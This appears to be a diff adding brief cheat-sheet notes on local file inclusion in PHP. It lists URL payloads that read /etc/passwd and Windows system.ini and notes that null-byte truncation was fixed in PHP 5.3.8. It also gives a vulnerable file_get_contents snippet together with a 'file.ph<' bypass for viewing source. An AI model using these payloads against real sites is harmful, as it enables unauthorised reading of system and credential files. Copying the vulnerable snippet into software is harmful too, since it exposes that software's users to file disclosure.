@@ -1,0 +1,8 @@
+?page=C:/Windows/system.ini ( Windows )
+?page=/etc/passwd ( Linux )
+============================================
+Nullbyte fixed in 5.3.8
+===============================
+if (substr($_GET['file'], -4, 4) != '.php')
+ echo file_get_contents($_GET['file']);
+ --> bypass by file.ph< --> view source
